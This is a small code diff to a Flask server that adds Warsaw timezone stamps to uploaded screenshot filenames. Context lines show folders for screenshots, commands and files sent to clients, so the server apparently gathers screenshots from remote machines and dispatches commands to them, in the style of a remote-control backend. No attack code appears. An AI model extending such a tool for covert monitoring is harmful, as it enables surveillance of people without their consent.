@@ -2,6 +2,7 @@ from flask import Flask, request, send_file, jsonify, render_template_string, re
 import os
 import datetime
 import json
+import pytz
 
 app = Flask(__name__)
 UPLOAD_FOLDER = "screens"
@@ -13,6 +14,8 @@ os.makedirs(UPLOAD_FOLDER, exist_ok=True)
 os.makedirs(COMMAND_FOLDER, exist_ok=True)
 os.makedirs(FILES_FOLDER, exist_ok=True)
 os.makedirs(UPLOADS_TO_CLIENTS, exist_ok=True)
+
+POLAND = pytz.timezone("Europe/Warsaw")
 
 @app.route("/")
 def index():
@@ -126,7 +129,7 @@ def upload():
     os.makedirs(user_folder, exist_ok=True)
 
     file = request.files['screenshot']
-    now = datetime.datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
+    now = datetime.datetime.now(POLAND).strftime("%Y-%m-%d_%H-%M-%S")
     filename = f"screenshot_{now}.png"
     filepath = os.path.join(user_folder, filename)
     file.save(filepath)
